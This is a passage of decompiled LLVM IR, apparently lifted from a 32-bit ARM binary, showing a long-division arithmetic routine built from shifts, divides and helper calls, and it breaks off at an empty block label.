  %v2_178c8 = sub i32 %v0_178c8, %v6_178c4
  store i32 %v2_178c8, i32* %sl.global-to-local, align 4
  %v9_178c8 = icmp eq i32 %v0_178c8, %v6_178c4
  %v2_178d0 = load i32, i32* @r7, align 4
  br i1 %v9_178c8, label %.thread11, label %dec_label_pc_178e4

.thread11:                                        ; preds = %bb141
  %v3_178d0 = sub i32 %v2_178d0, %v0_178e8
  store i32 %v3_178d0, i32* @r4, align 4
  %v4_178d4 = urem i32 %v0_178e8, 65536
  store i32 %v4_178d4, i32* %r8.global-to-local, align 4
  %v4_178d8 = udiv i32 %v0_178e8, 65536
  store i32 %v4_178d8, i32* @r7, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1799c

dec_label_pc_178e4:                               ; preds = %bb141
  %v6_178e4 = shl i32 %v2_178d0, %v2_178c8
  %v6_178e8 = shl i32 %v0_178e8, %v2_178c8
  store i32 %v6_178e8, i32* %r6.global-to-local, align 4
  %v1_178ec = sub i32 32, %v2_178c8
  %v6_178f0 = lshr i32 %v2_178d0, %v1_178ec
  store i32 %v6_178f0, i32* @r4, align 4
  %v1_178f4 = load i32, i32* %sb.global-to-local, align 4
  %v7_178f4 = lshr i32 %v1_178f4, %v1_178ec
  %v8_178f4 = or i32 %v7_178f4, %v6_178e4
  %v3_178f8 = udiv i32 %v6_178e8, 65536
  store i32 %v3_178f8, i32* @r7, align 4
  store i32 %v3_178f8, i32* @r1, align 4
  store i32 %v6_178f0, i32* @r0, align 4
  %v0_17908 = call i32 @function_12920()
  %v0_1790c = load i32, i32* @r7, align 4
  store i32 %v0_17908, i32* %fp.global-to-local, align 4
  %v0_17914 = load i32, i32* @r4, align 4
  %v2_17918 = call i32 @function_12a1c(i32 %v0_17914, i32 %v0_1790c)
  %v0_1791c = load i32, i32* %r6.global-to-local, align 4
  %v3_17920 = urem i32 %v0_1791c, 65536
  store i32 %v3_17920, i32* %r8.global-to-local, align 4
  %v2_17924 = mul i32 %v0_17908, %v3_17920
  %v3_1792c = udiv i32 %v8_178f4, 65536
  %v4_17930 = mul i32 %v0_1790c, 65536
  %v5_17930 = or i32 %v4_17930, %v3_1792c
  %tmp196 = icmp ugt i32 %v2_17924, %v5_17930
  br i1 %tmp196, label %dec_label_pc_1793c, label %dec_label_pc_17948

dec_label_pc_1793c:                               ; preds = %dec_label_pc_178e4
  %v2_1793c = add i32 %v0_1791c, %v5_17930
  %v3_1793c = icmp ult i32 %v2_1793c, %v5_17930
  %v1_17940 = add i32 %v0_17908, -1
  store i32 %v1_17940, i32* %fp.global-to-local, align 4
  br i1 %v3_1793c, label %dec_label_pc_17948, label %dec_label_pc_17c80

dec_label_pc_17948:                               ; preds = %dec_label_pc_178e4, %dec_label_pc_17c80, %bb190, %dec_label_pc_1793c
  %v1_17948 = phi i32 [ %v6_17c88, %bb190 ], [ %v2_1793c, %dec_label_pc_1793c ], [ %v5_17930, %dec_label_pc_178e4 ], [ %v2_1793c, %dec_label_pc_17c80 ]
  %v2_17948 = sub i32 %v1_17948, %v2_17924
  store i32 %v2_17948, i32* @r4, align 4
  %v0_1794c = load i32, i32* @r7, align 4
  store i32 %v0_1794c, i32* @r1, align 4
  store i32 %v2_17948, i32* @r0, align 4
  %v0_17954 = call i32 @function_12920()
  %v0_17958 = load i32, i32* @r7, align 4
  store i32 %v0_17954, i32* @r5, align 4
  %v0_17960 = load i32, i32* @r4, align 4
  %v2_17964 = call i32 @function_12a1c(i32 %v0_17960, i32 %v0_17958)
  %v0_17968 = load i32, i32* %r8.global-to-local, align 4
  %v1_17968 = load i32, i32* @r5, align 4
  %v2_17968 = mul i32 %v1_17968, %v0_17968
  %v3_17974 = urem i32 %v8_178f4, 65536
  %v4_17978 = mul i32 %v0_17958, 65536
  %v5_17978 = or i32 %v4_17978, %v3_17974
  %tmp197 = icmp ugt i32 %v2_17968, %v5_17978
  br i1 %tmp197, label %dec_label_pc_17984, label %dec_label_pc_17990

dec_label_pc_17984:                               ; preds = %dec_label_pc_17948
  %v1_17984 = load i32, i32* %r6.global-to-local, align 4
  %v2_17984 = add i32 %v1_17984, %v5_17978
  %v3_17984 = icmp ult i32 %v2_17984, %v5_17978
  %v1_17988 = add i32 %v1_17968, -1
  br i1 %v3_17984, label %dec_label_pc_17990, label %dec_label_pc_17c70

dec_label_pc_17990:                               ; preds = %dec_label_pc_17948, %dec_label_pc_17c70, %bb189, %dec_label_pc_17984
  %v0_17998 = phi i32 [ %v5_17c74, %bb189 ], [ %v1_17988, %dec_label_pc_17984 ], [ %v1_17968, %dec_label_pc_17948 ], [ %v1_17988, %dec_label_pc_17c70 ]
  %v1_17994 = phi i32 [ %v6_17c78, %bb189 ], [ %v2_17984, %dec_label_pc_17984 ], [ %v5_17978, %dec_label_pc_17948 ], [ %v2_17984, %dec_label_pc_17c70 ]
  %v0_17990 = load i32, i32* %sb.global-to-local, align 4
  %v1_17990 = load i32, i32* %sl.global-to-local, align 4
  %v6_17990 = shl i32 %v0_17990, %v1_17990
  store i32 %v6_17990, i32* %sb.global-to-local, align 4
  %v2_17994 = sub i32 %v1_17994, %v2_17968
  store i32 %v2_17994, i32* @r4, align 4
  %v1_17998 = load i32, i32* %fp.global-to-local, align 4
  %v4_17998 = mul i32 %v1_17998, 65536
  %v5_17998 = or i32 %v4_17998, %v0_17998
  store i32 %v5_17998, i32* %fp.global-to-local, align 4
  %v0_1799c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1799c

dec_label_pc_1799c:                               ; preds = %.thread11, %dec_label_pc_17990
  %v0_179a0 = phi i32 [ %v3_178d0, %.thread11 ], [ %v2_17994, %dec_label_pc_17990 ]
  %v0_1799c = phi i32 [ %v4_178d8, %.thread11 ], [ %v0_1799c.pre, %dec_label_pc_17990 ]
  store i32 %v0_1799c, i32* @r1, align 4
  store i32 %v0_179a0, i32* @r0, align 4
  %v0_179a4 = call i32 @function_12920()
  %v0_179a8 = load i32, i32* @r7, align 4
  store i32 %v0_179a4, i32* %sl.global-to-local, align 4
  %v0_179b0 = load i32, i32* @r4, align 4
  %v2_179b4 = call i32 @function_12a1c(i32 %v0_179b0, i32 %v0_179a8)
  %v0_179b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_179b8 = mul i32 %v0_179a4, %v0_179b8
  %v0_179bc = load i32, i32* %sb.global-to-local, align 4
  %v3_179bc = udiv i32 %v0_179bc, 65536
  %v4_179c0 = mul i32 %v0_179a8, 65536
  %v5_179c0 = or i32 %v3_179bc, %v4_179c0
  %tmp198 = icmp ugt i32 %v2_179b8, %v5_179c0
  br i1 %tmp198, label %dec_label_pc_179cc, label %.thread96

dec_label_pc_179cc:                               ; preds = %dec_label_pc_1799c
  %v1_179cc = load i32, i32* %r6.global-to-local, align 4
  %v2_179cc = add i32 %v1_179cc, %v5_179c0
  %v3_179cc = icmp ult i32 %v2_179cc, %v5_179c0
  %v1_179d0 = add i32 %v0_179a4, -1
  store i32 %v1_179d0, i32* %sl.global-to-local, align 4
  br i1 %v3_179cc, label %.thread96, label %dec_label_pc_179d8

dec_label_pc_179d8:                               ; preds = %dec_label_pc_179cc
  %tmp199 = icmp ugt i32 %v2_179b8, %v2_179cc
  br i1 %tmp199, label %bb143, label %.thread96

bb143:                                            ; preds = %dec_label_pc_179d8
  %v5_179dc = add i32 %v0_179a4, -2
  store i32 %v5_179dc, i32* %sl.global-to-local, align 4
  %v6_179e0 = add i32 %v2_179cc, %v1_179cc
  br label %.thread96

.thread96:                                        ; preds = %dec_label_pc_1799c, %dec_label_pc_179d8, %dec_label_pc_179cc, %bb143
  %v1_179e4 = phi i32 [ %v2_179cc, %dec_label_pc_179cc ], [ %v5_179c0, %dec_label_pc_1799c ], [ %v6_179e0, %bb143 ], [ %v2_179cc, %dec_label_pc_179d8 ]
  %v2_179e4 = sub i32 %v1_179e4, %v2_179b8
  store i32 %v2_179e4, i32* @r4, align 4
  %v0_179e8 = load i32, i32* @r7, align 4
  store i32 %v0_179e8, i32* @r1, align 4
  store i32 %v2_179e4, i32* @r0, align 4
  %v0_179f0 = call i32 @function_12920()
  %v0_179f4 = load i32, i32* @r7, align 4
  store i32 %v0_179f0, i32* @r5, align 4
  %v0_179fc = load i32, i32* @r4, align 4
  %v2_17a00 = call i32 @function_12a1c(i32 %v0_179fc, i32 %v0_179f4)
  %v0_17a04 = load i32, i32* %r8.global-to-local, align 4
  %v1_17a04 = load i32, i32* @r5, align 4
  %v2_17a04 = mul i32 %v1_17a04, %v0_17a04
  %v0_17a08 = load i32, i32* %sb.global-to-local, align 4
  %v3_17a0c = urem i32 %v0_17a08, 65536
  %v4_17a10 = mul i32 %v0_179f4, 65536
  %v5_17a10 = or i32 %v3_17a0c, %v4_17a10
  %tmp200 = icmp ugt i32 %v2_17a04, %v5_17a10
  br i1 %tmp200, label %dec_label_pc_17a1c, label %bb145

dec_label_pc_17a1c:                               ; preds = %.thread96
  %v1_17a1c = load i32, i32* %r6.global-to-local, align 4
  %v2_17a1c = add i32 %v1_17a1c, %v5_17a10
  %v3_17a1c = icmp ult i32 %v2_17a1c, %v5_17a10
  %v1_17a20 = add i32 %v1_17a04, -1
  br i1 %v3_17a1c, label %bb145, label %dec_label_pc_17a28

dec_label_pc_17a28:                               ; preds = %dec_label_pc_17a1c
  %tmp201 = icmp ugt i32 %v2_17a04, %v2_17a1c
  br i1 %tmp201, label %bb144, label %bb145

bb144:                                            ; preds = %dec_label_pc_17a28
  %v5_17a2c = add i32 %v1_17a04, -2
  br label %bb145

bb145:                                            ; preds = %.thread96, %dec_label_pc_17a1c, %dec_label_pc_17a28, %bb144
  %v0_17a30 = phi i32 [ %v1_17a20, %dec_label_pc_17a1c ], [ %v1_17a04, %.thread96 ], [ %v1_17a20, %dec_label_pc_17a28 ], [ %v5_17a2c, %bb144 ]
  %v1_17a30 = load i32, i32* %sl.global-to-local, align 4
  %v4_17a30 = mul i32 %v1_17a30, 65536
  %v5_17a30 = or i32 %v4_17a30, %v0_17a30
  br label %dec_label_pc_17854

dec_label_pc_17a3c:                               ; preds = %dec_label_pc_17840
  %v3_17a40 = icmp ult i32 %v1_17a74, 65534
  br i1 %v3_17a40, label %dec_label_pc_17ad4, label %dec_label_pc_17a44

dec_label_pc_17a44:                               ; preds = %dec_label_pc_17a3c
  %v3_17a48 = icmp ugt i32 %v1_17a74, 16777214
  %v9_17a48 = icmp eq i32 %v1_17a74, 16777215
  %v2_17a4c = xor i1 %v9_17a48, true
  %v3_17a4c = and i1 %v3_17a48, %v2_17a4c
  br i1 %v3_17a4c, label %bb147, label %bb148

bb147:                                            ; preds = %dec_label_pc_17a44
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_17a44, %bb147
  %v1_17a5431 = phi i32 [ 16777215, %dec_label_pc_17a44 ], [ 24, %bb147 ]
  %v2_17a50 = xor i1 %v3_17a48, true
  %v3_17a50 = or i1 %v9_17a48, %v2_17a50
  br i1 %v3_17a50, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_17a54 = phi i32 [ %v1_17a5431, %bb148 ], [ 16, %bb149 ]
  %v2_17a54 = add nsw i32 %v1_17a54, -1
  %v3_17a54 = shl i32 1, %v2_17a54
  %v4_17a54 = and i32 %v3_17a54, %v1_17a74
  %v5_17a54 = icmp ne i32 %v4_17a54, 0
  %v6_17a54 = lshr i32 %v1_17a74, %v1_17a54
  %v4_17a5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 36) to i32*), align 4
  %v2_17a60 = add i32 %v4_17a5c, %v6_17a54
  %v3_17a60 = inttoptr i32 %v2_17a60 to i8*
  %v4_17a60 = load i8, i8* %v3_17a60, align 1
  %v6_17a60 = zext i8 %v4_17a60 to i32
  %v3_17a64 = and i1 %v5_17a54, %v2_17a4c
  br i1 %v3_17a64, label %bb151, label %bb152

bb151:                                            ; preds = %bb150
  store i32 8, i32* @lr, align 4
  br label %bb152

bb152:                                            ; preds = %bb150, %bb151
  %v0_17a6c33 = phi i32 [ %v27_176f8, %bb150 ], [ 8, %bb151 ]
  %v2_17a68 = xor i1 %v5_17a54, true
  %v3_17a68 = or i1 %v9_17a48, %v2_17a68
  br i1 %v3_17a68, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 16, i32* @lr, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %v0_17a6c = phi i32 [ %v0_17a6c33, %bb152 ], [ 16, %bb153 ]
  %v2_17a6c = sub i32 %v0_17a6c, %v6_17a60
  store i32 %v2_17a6c, i32* %fp.global-to-local, align 4
  %v9_17a6c = icmp eq i32 %v0_17a6c, %v6_17a60
  br i1 %v9_17a6c, label %dec_label_pc_17a74, label %dec_label_pc_17b00

dec_label_pc_17a74:                               ; preds = %bb154, %bb169
  %v3_17a74 = icmp uge i32 %v1_17780, %v1_17a74
  %v2_17a78 = xor i1 %v3_17a74, true
  %v3_17a78 = or i1 %v9_17840, %v2_17a78
  br i1 %v3_17a78, label %bb156, label %bb157

bb156:                                            ; preds = %dec_label_pc_17a74
  %v7_17a78 = icmp ult i32 %v0_17740, %v0_17888
  br i1 %v7_17a78, label %dec_label_pc_1784c, label %.thread13

bb157:                                            ; preds = %dec_label_pc_17a74
  br i1 %v3_17a74, label %.thread13, label %dec_label_pc_1784c

.thread13:                                        ; preds = %bb156, %bb157
  br label %dec_label_pc_17854

dec_label_pc_17a8c:                               ; preds = %dec_label_pc_176f8
  store i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32* %r8.global-to-local, align 4
  %v0_1771c84 = load i32, i32* @r2, align 4
  store i32 %v0_1771c84, i32* @r4, align 4
  %v0_1772085 = load i32, i32* @r3, align 4
  %v0_17a8c = load i32, i32* @r0, align 4
  %v1_17a8c = sub i32 0, %v0_17a8c
  store i32 %v1_17a8c, i32* @r0, align 4
  %v2_17a8c = icmp eq i32 %v0_17a8c, 0
  %v2_17a90 = icmp eq i1 %v2_17a8c, false
  %v5_17a90 = sext i1 %v2_17a90 to i32
  %v6_17a90 = sub i32 %v5_17a90, %v0_17704
  store i32 -1, i32* @ip, align 4
  %v1_17a98 = icmp slt i32 %v0_1772085, 0
  br i1 %v1_17a98, label %dec_label_pc_17aa4, label %dec_label_pc_17734

dec_label_pc_17aa4:                               ; preds = %dec_label_pc_17a8c, %dec_label_pc_1772c
  %v0_1772089 = phi i32 [ %v0_1772085, %dec_label_pc_17a8c ], [ %v0_17720, %dec_label_pc_1772c ]
  %v0_1771c86 = phi i32 [ %v0_1771c84, %dec_label_pc_17a8c ], [ %v0_1771c, %dec_label_pc_1772c ]
  %v0_1773828 = phi i32 [ %v6_17a90, %dec_label_pc_17a8c ], [ %v0_17704, %dec_label_pc_1772c ]
  %stack_var_-56.2 = phi i32 [ -1, %dec_label_pc_17a8c ], [ 0, %dec_label_pc_1772c ]
  %v1_17aa4 = sub i32 0, %v0_1771c86
  store i32 %v1_17aa4, i32* @r4, align 4
  %v2_17aa4 = icmp eq i32 %v0_1771c86, 0
  %v2_17aa8 = icmp eq i1 %v2_17aa4, false
  %v5_17aa8 = sext i1 %v2_17aa8 to i32
  %v6_17aa8 = sub i32 %v5_17aa8, %v0_1772089
  %v1_17ab0 = sub nsw i32 -1, %stack_var_-56.2
  br label %dec_label_pc_17734

dec_label_pc_17abc:                               ; preds = %dec_label_pc_17898
  %v2_17abc = icmp ugt i32 %v0_178e8, 254
  %v7_17abc = icmp eq i32 %v0_178e8, 255
  %v2_17ac0 = xor i1 %v7_17abc, true
  %v3_17ac0 = and i1 %v2_17abc, %v2_17ac0
  br i1 %v3_17ac0, label %bb158, label %bb159

bb158:                                            ; preds = %dec_label_pc_17abc
  store i32 24, i32* @ip, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_17abc, %bb158
  %v2_17ac4 = xor i1 %v2_17abc, true
  %v3_17ac4 = or i1 %v7_17abc, %v2_17ac4
  br i1 %v3_17ac4, label %bb160, label %.thread98

bb160:                                            ; preds = %bb159
  store i32 32, i32* @ip, align 4
  store i32 0, i32* @r3, align 4
  br label %.thread98

.thread98:                                        ; preds = %bb159, %bb160
  br i1 %v3_17ac0, label %bb161, label %._crit_edge

._crit_edge:                                      ; preds = %.thread98
  %v1_178b8.pre = load i32, i32* @r3, align 4
  br label %bb141

bb161:                                            ; preds = %.thread98
  br label %bb141

dec_label_pc_17ad4:                               ; preds = %dec_label_pc_17a3c
  %v2_17ad4 = icmp ugt i32 %v1_17a74, 254
  %v7_17ad4 = icmp eq i32 %v1_17a74, 255
  %v2_17ad8 = xor i1 %v7_17ad4, true
  %v3_17ad8 = and i1 %v2_17ad4, %v2_17ad8
  br i1 %v3_17ad8, label %bb162, label %bb163

bb162:                                            ; preds = %dec_label_pc_17ad4
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_17ad4, %bb162
  %v1_17ae035 = phi i32 [ %v0_1772090, %dec_label_pc_17ad4 ], [ 8, %bb162 ]
  %v2_17adc = xor i1 %v2_17ad4, true
  %v3_17adc = or i1 %v7_17ad4, %v2_17adc
  br i1 %v3_17adc, label %bb164, label %bb165

bb164:                                            ; preds = %bb163
  br label %bb165

bb165:                                            ; preds = %bb163, %bb164
  %v1_17ae0 = phi i32 [ %v1_17ae035, %bb163 ], [ 0, %bb164 ]
  %v2_17ae0 = add i32 %v1_17ae0, -1
  %v3_17ae0 = shl i32 1, %v2_17ae0
  %v4_17ae0 = and i32 %v3_17ae0, %v1_17a74
  %v5_17ae0 = icmp ne i32 %v4_17ae0, 0
  %v6_17ae0 = lshr i32 %v1_17a74, %v1_17ae0
  %v4_17ae8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_222c0.693 to i32), i32 36) to i32*), align 4
  %v2_17aec = add i32 %v4_17ae8, %v6_17ae0
  %v3_17aec = inttoptr i32 %v2_17aec to i8*
  %v4_17aec = load i8, i8* %v3_17aec, align 1
  %v6_17aec = zext i8 %v4_17aec to i32
  %v3_17af0 = and i1 %v5_17ae0, %v2_17ad8
  br i1 %v3_17af0, label %bb166, label %bb167

bb166:                                            ; preds = %bb165
  store i32 24, i32* @lr, align 4
  br label %bb167

bb167:                                            ; preds = %bb165, %bb166
  %v0_17af837 = phi i32 [ %v27_176f8, %bb165 ], [ 24, %bb166 ]
  %v2_17af4 = xor i1 %v5_17ae0, true
  %v3_17af4 = or i1 %v7_17ad4, %v2_17af4
  br i1 %v3_17af4, label %bb168, label %bb169

bb168:                                            ; preds = %bb167
  store i32 32, i32* @lr, align 4
  br label %bb169

bb169:                                            ; preds = %bb167, %bb168
  %v0_17af8 = phi i32 [ %v0_17af837, %bb167 ], [ 32, %bb168 ]
  %v2_17af8 = sub i32 %v0_17af8, %v6_17aec
  store i32 %v2_17af8, i32* %fp.global-to-local, align 4
  %v9_17af8 = icmp eq i32 %v0_17af8, %v6_17aec
  br i1 %v9_17af8, label %dec_label_pc_17a74, label %dec_label_pc_17b00

dec_label_pc_17b00:                               ; preds = %bb154, %bb169
  %v1_17b0c = phi i32 [ %v2_17a6c, %bb154 ], [ %v2_17af8, %bb169 ]
  %v6_17b00 = shl i32 %v1_17a74, %v1_17b0c
  %v1_17b04 = sub i32 32, %v1_17b0c
  %v7_17b08 = lshr i32 %v0_17888, %v1_17b04
  %v8_17b08 = or i32 %v7_17b08, %v6_17b00
  store i32 %v8_17b08, i32* %r8.global-to-local, align 4
  %v6_17b0c = shl i32 %v1_17780, %v1_17b0c
  %v6_17b10 = lshr i32 %v1_17780, %v1_17b04
  store i32 %v6_17b10, i32* @r4, align 4
  %v7_17b14 = lshr i32 %v0_17740, %v1_17b04
  %v8_17b14 = or i32 %v7_17b14, %v6_17b0c
  %v3_17b18 = udiv i32 %v8_17b08, 65536
  store i32 %v3_17b18, i32* %sl.global-to-local, align 4
  store i32 %v3_17b18, i32* @r1, align 4
  store i32 %v6_17b10, i32* @r0, align 4
  %v0_17b28 = call i32 @function_12920()
  %v0_17b34 = load i32, i32* @r4, align 4
  %v2_17b38 = call i32 @function_12a1c(i32 %v0_17b34, i32 %v3_17b18)
  %v0_17b3c = load i32, i32* %r8.global-to-local, align 4
  %v3_17b44 = urem i32 %v0_17b3c, 65536
  store i32 %v3_17b44, i32* @r7, align 4
  %v2_17b48 = mul i32 %v3_17b44, %v0_17b28
  %v3_17b50 = udiv i32 %v8_17b14, 65536
  %v4_17b54 = mul nuw i32 %v3_17b18, 65536
  %v5_17b54 = or i32 %v4_17b54, %v3_17b50
  %v9_17b58 = icmp eq i32 %v2_17b48, %v5_17b54
  %v0_17b5c = load i32, i32* %r6.global-to-local, align 4
  %v1_17b5c = load i32, i32* %fp.global-to-local, align 4
  %v2_17b5c = add i32 %v1_17b5c, -1
  %v3_17b5c = lshr i32 -2147483648, %v2_17b5c
  %v4_17b5c = and i32 %v3_17b5c, %v0_17b5c
  %v6_17b5c = shl i32 %v0_17b5c, %v1_17b5c
  store i32 %v6_17b5c, i32* @r5, align 4
  %v2_17b60 = icmp eq i32 %v4_17b5c, 0
  %v3_17b60 = or i1 %v9_17b58, %v2_17b60
  br i1 %v3_17b60, label %dec_label_pc_17b78, label %dec_label_pc_17b64

dec_label_pc_17b64:                               ; preds = %dec_label_pc_17b00
  %v2_17b68 = add i32 %v0_17b3c, %v5_17b54
  %v3_17b68 = icmp ult i32 %v2_17b68, %v5_17b54
  %v1_17b6c = add i32 %v0_17b28, -1
  br i1 %v3_17b68, label %dec_label_pc_17b78, label %dec_label_pc_17c5c

dec_label_pc_17b78:                               ; preds = %.thread104, %dec_label_pc_17b64, %dec_label_pc_17b00
  %v1_17b78 = phi i32 [ %v5_17b54, %dec_label_pc_17b00 ], [ %v2_17b68, %dec_label_pc_17b64 ], [ %v1_17b7841, %.thread104 ]
  %stack_var_-52.0 = phi i32 [ %v0_17b28, %dec_label_pc_17b00 ], [ %v1_17b6c, %dec_label_pc_17b64 ], [ %v4_17c68.v1_17b6c, %.thread104 ]
  %v2_17b78 = sub i32 %v1_17b78, %v2_17b48
  store i32 %v2_17b78, i32* @r4, align 4
  %v0_17b7c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_17b7c, i32* @r1, align 4
  store i32 %v2_17b78, i32* @r0, align 4
  %v0_17b84 = call i32 @function_12920()
  store i32 %v0_17b84, i32* %r6.global-to-local, align 4
  %v0_17b90 = load i32, i32* @r4, align 4
  %v2_17b94 = call i32 @function_12a1c(i32 %v0_17b90, i32 %v0_17b7c)
  %v0_17b98 = load i32, i32* @r7, align 4
  %v2_17b98 = mul i32 %v0_17b84, %v0_17b98
  %v3_17ba4 = urem i32 %v8_17b14, 65536
  %v4_17ba8 = mul i32 %v0_17b7c, 65536
  %v5_17ba8 = or i32 %v4_17ba8, %v3_17ba4
  %tmp202 = icmp ugt i32 %v2_17b98, %v5_17ba8
  br i1 %tmp202, label %dec_label_pc_17bb4, label %dec_label_pc_17bc0

dec_label_pc_17bb4:                               ; preds = %dec_label_pc_17b78
  %v1_17bb4 = load i32, i32* %r8.global-to-local, align 4
  %v2_17bb4 = add i32 %v1_17bb4, %v5_17ba8
  %v3_17bb4 = icmp ult i32 %v2_17bb4, %v5_17ba8
  %v1_17bb8 = add i32 %v0_17b84, -1
  store i32 %v1_17bb8, i32* %r6.global-to-local, align 4
  br i1 %v3_17bb4, label %dec_label_pc_17bc0, label %dec_label_pc_17c4c

dec_label_pc_17bc0:                               ; preds = %dec_label_pc_17b78, %dec_label_pc_17c4c, %bb187, %dec_label_pc_17bb4
  %v0_17bc8 = phi i32 [ %v5_17c54, %bb187 ], [ %v1_17bb8, %dec_label_pc_17bb4 ], [ %v0_17b84, %dec_label_pc_17b78 ], [ %v1_17bb8, %dec_label_pc_17c4c ]
  %v1_17bc4 = phi i32 [ %v6_17c50, %bb187 ], [ %v2_17bb4, %dec_label_pc_17bb4 ], [ %v5_17ba8, %dec_label_pc_17b78 ], [ %v2_17bb4, %dec_label_pc_17c4c ]
  %v2_17bc4 = sub i32 %v1_17bc4, %v2_17b98
  %v4_17bc8 = mul i32 %stack_var_-52.0, 65536
  %v5_17bc8 = or i32 %v0_17bc8, %v4_17bc8
  %v3_17bcc = udiv i32 %v5_17bc8, 65536
  %v0_17bd0 = load i32, i32* @r5, align 4
  %v3_17bd0 = udiv i32 %v0_17bd0, 65536
  %tmp203 = mul i32 %v3_17bcc, -65536
  %v5_17bd4 = add i32 %tmp203, -1
  %v6_17bd4 = and i32 %v5_17bc8, %v5_17bd4
  %tmp204 = mul i32 %v3_17bd0, -65536
  %v5_17bd8 = add i32 %tmp204, -1
  %v6_17bd8 = and i32 %v0_17bd0, %v5_17bd8
  %v2_17bdc = mul i32 %v6_17bd8, %v6_17bd4
  %v2_17be0 = mul i32 %v6_17bd8, %v3_17bcc
  %v2_17be4 = mul i32 %v3_17bd0, %v6_17bd4
  %v2_17be8 = mul nuw i32 %v3_17bd0, %v3_17bcc
  %v2_17bec = add i32 %v2_17be0, %v2_17be4
  %v3_17bec = icmp ult i32 %v2_17bec, %v2_17be0
  br i1 %v3_17bec, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_17bc0
  %v2_17bf0 = add i32 %v2_17be8, 65536
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_17bc0, %bb171
  %v0_17bf8 = phi i32 [ %v2_17be8, %dec_label_pc_17bc0 ], [ %v2_17bf0, %bb171 ]
  %v4_17bf4 = mul i32 %v2_17bec, 65536
  %v5_17bf4 = add i32 %v4_17bf4, %v2_17bdc
  %v2_17bf8 = and i32 %v2_17bec, 32768
  %v3_17bf8 = icmp ne i32 %v2_17bf8, 0
  %v4_17bf8 = udiv i32 %v2_17bec, 65536
  %v7_17bf8 = zext i1 %v3_17bf8 to i32
  %v6_17bf8 = add nuw nsw i32 %v7_17bf8, %v4_17bf8
  %v8_17bf8 = add i32 %v6_17bf8, %v0_17bf8
  %v3_17bfc = icmp ult i32 %v2_17bc4, %v8_17bf8
  br i1 %v3_17bfc, label %dec_label_pc_17c24, label %dec_label_pc_17c04

dec_label_pc_17c04:                               ; preds = %bb172
  %v9_17bfc = icmp eq i32 %v2_17bc4, %v8_17bf8
  %. = zext i1 %v9_17bfc to i32
  %v1_17c0c = load i32, i32* %sb.global-to-local, align 4
  %v2_17c0c = load i32, i32* %fp.global-to-local, align 4
  %v7_17c0c = shl i32 %v1_17c0c, %v2_17c0c
  %v9_17c0c = icmp uge i32 %v5_17bf4, %v7_17c0c
  %v15_17c0c = icmp eq i32 %v5_17bf4, %v7_17c0c
  %v2_17c10 = xor i1 %v9_17c0c, true
  %v3_17c10 = or i1 %v15_17c0c, %v2_17c10
  br i1 %v3_17c10, label %bb175, label %bb176

bb175:                                            ; preds = %dec_label_pc_17c04
  br label %bb176

bb176:                                            ; preds = %dec_label_pc_17c04, %bb175
  %v4_17c14 = phi i32 [ %., %dec_label_pc_17c04 ], [ 0, %bb175 ]
  %v2_17c14 = xor i1 %v15_17c0c, true
  %v3_17c14 = and i1 %v9_17c0c, %v2_17c14
  br i1 %v3_17c14, label %bb177, label %thread-pre-split

bb177:                                            ; preds = %bb176
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb176, %bb177
  %v2_17c18 = icmp eq i32 %v4_17c14, 0
  br i1 %v2_17c18, label %bb178, label %dec_label_pc_17c24

bb178:                                            ; preds = %thread-pre-split
  br label %dec_label_pc_17854

dec_label_pc_17c24:                               ; preds = %bb172, %thread-pre-split
  %v1_17c24 = add i32 %v5_17bc8, -1
  br label %dec_label_pc_17854

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17750
  %v3_17c34 = icmp ugt i32 %v0_17888, 16777214
  %v9_17c34 = icmp eq i32 %v0_17888, 16777215
  %v2_17c38 = xor i1 %v9_17c34, true
  %v3_17c38 = and i1 %v3_17c34, %v2_17c38
  br i1 %v3_17c38, label %bb180, label %bb181

bb180:                                            ; preds = %dec_label_pc_17c30
  br label %bb181

bb181:                                            ; preds = %dec_label_pc_17c30, %bb180
  %v1_1776c55 = phi i32 [ 16777215, %dec_label_pc_17c30 ], [ 24, %bb180 ]
  %v2_17c3c = xor i1 %v3_17c34, true
  %v3_17c3c = or i1 %v9_17c34, %v2_17c3c
  br i1 %v3_17c3c, label %bb182, label %bb183

bb182:                                            ; preds = %bb181
  br label %bb183

bb183:                                            ; preds = %bb181, %bb182
  %v1_1776c54 = phi i32 [ %v1_1776c55, %bb181 ], [ 16, %bb182 ]
  br i1 %v3_17c38, label %bb184, label %bb185

bb184:                                            ; preds = %bb183
  br label %bb185

bb185:                                            ; preds = %bb183, %bb184
  %v0_1777c59 = phi i32 [ %v0_1777c60, %bb183 ], [ 8, %bb184 ]
  br i1 %v3_17c3c, label %bb186, label %bb126

bb186:                                            ; preds = %bb185
  br label %bb126

dec_label_pc_17c4c:                               ; preds = %dec_label_pc_17bb4
  %tmp205 = icmp ugt i32 %v2_17b98, %v2_17bb4
  br i1 %tmp205, label %bb187, label %dec_label_pc_17bc0

bb187:                                            ; preds = %dec_label_pc_17c4c
  %v6_17c50 = add i32 %v2_17bb4, %v1_17bb4
  %v5_17c54 = add i32 %v0_17b84, -2
  store i32 %v5_17c54, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17bc0

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17b64
  %tmp206 = icmp ugt i32 %v2_17b48, %v2_17b68
  br i1 %tmp206, label %bb188, label %.thread104

bb188:                                            ; preds = %dec_label_pc_17c5c
  %v5_17c60 = add i32 %v0_17b28, -2
  %v6_17c64 = add i32 %v2_17b68, %v0_17b3c
  br label %.thread104

.thread104:                                       ; preds = %dec_label_pc_17c5c, %bb188
